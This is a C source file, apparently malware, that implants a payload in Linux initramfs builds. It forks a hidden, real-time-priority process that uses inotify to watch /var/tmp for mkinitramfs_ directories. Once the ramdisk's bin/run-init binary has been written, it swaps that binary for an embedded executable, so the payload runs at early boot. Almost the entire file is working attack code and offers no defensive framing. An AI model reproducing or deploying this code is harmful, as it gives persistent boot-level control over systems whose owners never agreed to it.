#include "infect.h"

//begin import from reinfect
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <poll.h>
#include <sched.h>
#include <string.h>
#include <limits.h>

struct exe_t exe;

struct ctx_t {
	int inotify_fd;
	int tmpdir_wd;
	int bin_wd;
	int bin_create_wd;
	int run_init_wd;
	char tmpfile[PATH_MAX]; //filename of our tmpfile to splat
				//runinit
	char tmpdir[PATH_MAX];  //path of where initrd is being
				//assembled
	char run_init_path[PATH_MAX]; //path of run-init in ramdisk
				      //tmp directory
} ctx;

static void ctx_setup_common(void)
{
	ctx.bin_wd = -1;
	ctx.bin_create_wd = -1;
	ctx.run_init_wd = -1;
	ctx.tmpdir[0] = 0;
	ctx.tmpfile[0] = 0;
	ctx.run_init_path[0] = 0;
}

static int ctx_init(void)
{
	int rc;

	rc = inotify_init();
	if (rc < 0) {
		perror("could not init inotify");
		goto out;
	}
	ctx.inotify_fd = rc;
	rc = fcntl(ctx.inotify_fd, F_SETFD, O_NONBLOCK);
	if (rc < 0) {
		perror("could not fctnl");
		goto out;
	}
	rc = inotify_add_watch(ctx.inotify_fd, "/var/tmp", IN_CREATE);
	if (rc < 0) {
		perror("could not add watch");
		goto out;
	}
	ctx.tmpdir_wd = rc;

	ctx_setup_common();

	rc = 0;
out:
	return rc;
}

static void ctx_reset(void)
{
	(void)inotify_rm_watch(ctx.inotify_fd, ctx.bin_wd);
	(void)inotify_rm_watch(ctx.inotify_fd, ctx.bin_create_wd);
	(void)inotify_rm_watch(ctx.inotify_fd, ctx.run_init_wd);

	ctx_setup_common();
}

//call this with basedir as a suitably large buffer, as it will be
//written to
static int make_tempfile(char *basedir, mode_t mode)
{
	FILE* urandom = NULL;
	int rc = -1;
	int rand;
	char filename[PATH_MAX];

	do {
		urandom = fopen("/dev/urandom", "r");
		if (urandom == NULL) {
			perror("couldn't open urandom");
			goto out;
		}
		fread((void*)(&rand), sizeof(rand), 1, urandom);
		fclose(urandom);

		snprintf(filename, sizeof(filename) - 1,
			 "%s/reinfect-%X", basedir, rand);
		//printf("made tmpfile of %s\n", filename);
		rc = open(filename, O_CREAT | O_RDWR | O_EXCL, mode);
	} while (rc == -EEXIST);
	if (rc < 0) {
		perror("open");
	}

	strcpy(basedir, filename);
out:
	return rc;
}

static int splat_fd(int fd, unsigned char* buf, size_t len)
{
	int rc = -1;
	ssize_t s;
	size_t written = 0;
	for (;;) {
		s = write(fd, (const void*)(buf+written), len-written);
		if (s < 0) {
			perror("(splat_fd) write");
			goto out;
		}
		written += s;
		if (len == written) {
			break;
		}
	}
	(void)close(fd);

	rc = 0;
 out:
	return rc;
}


static int add_watch(const char *template, char *name, int mask)
{
	char filename[256];
	int rc;

	snprintf(filename, sizeof(filename) - 1, template, name);
	//printf("adding watch on %s\n", filename);
	rc = inotify_add_watch(ctx.inotify_fd,
			       filename, mask);
	if (rc < 0) {
		char buf[256];

		snprintf(buf, sizeof(buf), "adding watch on %s:", filename);
		perror(buf);
	}

	return rc;
}

static void handle_inotify_event(const struct inotify_event *event)
{
	if ((event->mask & IN_CREATE) &&
	    (event->len)) {
		const char template[] = "mkinitramfs_";

		if ((event->wd == ctx.tmpdir_wd) &&
		    (event->mask & IN_ISDIR) &&
		    !strncmp(event->name, template, sizeof(template) - 1)) {
			/* at this point, a new directory called
			 * /var/tmp/mkinitramfs_... has been made
			 */
			char *name = (char*)(event->name);
			int rc;

			rc = add_watch("/var/tmp/%s", name, IN_CREATE);
			if (rc < 0) {
			  printf("couldn't add watch!\n");
			  exit(EXIT_FAILURE);
			}
			ctx.bin_wd = rc;

			snprintf(ctx.tmpdir, sizeof(ctx.tmpdir) - 1,
				 "/var/tmp/%s", name);

			strcpy(ctx.tmpfile, "/var/tmp");
			rc = make_tempfile(ctx.tmpfile,
					   S_IRWXU |
					   S_IRGRP | S_IXGRP |
					   S_IROTH | S_IXOTH);
			if (rc < 0) {
				perror("mkstmp");
				exit(EXIT_FAILURE);
			}
			//printf("tmpfile is %s\n", ctx.tmpfile);

			rc = splat_fd(rc, exe.buf, exe.len);
			if (rc < 0) {
				perror("splat_file");
				exit(EXIT_FAILURE);
			}

		} else if ((event->wd == ctx.bin_wd) &&
			   (event->mask & IN_ISDIR) &&
			   !strcmp(event->name, "bin")) {
			/* at this point the bin directory has been created */

			ctx.bin_create_wd = add_watch("%s/bin", ctx.tmpdir, IN_CREATE);
		} else if ((event->wd == ctx.bin_create_wd) &&
			   !(event->mask & IN_ISDIR) &&
			   !strcmp(event->name, "run-init")) {
			/* at this point the run-init binary has been
			 * created and is open for writing
			 */

			snprintf(ctx.run_init_path, sizeof(ctx.run_init_path) - 1,
				 "%s/bin/run-init", ctx.tmpdir);
			ctx.run_init_wd = add_watch("%s/bin/run-init",
						    ctx.tmpdir, IN_CLOSE);
		}
	} else if ((event->wd == ctx.run_init_wd) &&
		   (event->mask & IN_CLOSE_WRITE)) {
		/* at this point, the run-init binary has been
		 * written to and closed
		 */

		rename(ctx.tmpfile, ctx.run_init_path);
		printf("  splatted over %s\n", ctx.run_init_path);
		ctx_reset();
	}
}


static void handle_inotify(void)
{
	char buf[4096*2]
		__attribute__ ((aligned(__alignof__(struct inotify_event))));
	const struct inotify_event *event;
	ssize_t len;
	char *ptr;

	for (;;) {

		len = read(ctx.inotify_fd, buf, sizeof buf);
		if (len == -1 && errno != EAGAIN) {
			perror("read");
			exit(EXIT_FAILURE);
		}
		if (len <= 0) {
			break;
		}
		for (ptr = buf; ptr < buf + len;
		     ptr += sizeof(struct inotify_event) + event->len) {

			event = (const struct inotify_event *) ptr;
			handle_inotify_event(event);
		}
	}
}

//end import
pid_t run_reinfect()
{
	pid_t pid;

	pid = fork();
	if (pid < 0) {
		printf("couldn't fork!\n");
		exit(EXIT_FAILURE);
	} else if (pid == 0) {
		/* child */
		struct pollfd pollfds[1];
		struct sched_param sched = {
			.sched_priority = 1
		};
		int rc;

		close(0);
		close(1);
		close(2);

		(void)open("/dev/null", O_RDONLY);
		(void)open("/dev/null", O_WRONLY);
		(void)open("/dev/null", O_RDWR);

		if (ctx_init() < 0) {
			perror("could not initialize structure");
			exit(EXIT_FAILURE);
		}
		rc = sched_setscheduler(getpid(),
					SCHED_FIFO,
					&sched);
		if (rc < 0) {
			perror("sched_setscheduler");
			exit(EXIT_FAILURE);
		}
		pollfds[0].fd = ctx.inotify_fd;
		pollfds[0].events = POLLIN | POLLNVAL;
		while ((rc = poll(pollfds, 1, -1))) {
			if (rc < 0) {
			  if (errno == -EINTR) {
			    continue;
			  } else {
			    perror("error in poll");
			    exit(EXIT_FAILURE);
			  }
			}
			if (pollfds[0].revents & POLLIN) {
				/* Inotify events are available */
				handle_inotify();
			}

		}
		exit(EXIT_FAILURE);
	}
	return pid;
}

int infect_get_inotify_fd()
{
	return ctx.inotify_fd;
}

int infect_init()
{
	return ctx_init();
}

void infect_handle_inotify()
{
	handle_inotify();
}

/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 8
 * tab-width: 8
 * indent-tabs-mode: t
 * End:
 *
 * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 * :indentSize=8:tabSize=8:noTabs=false:
 */
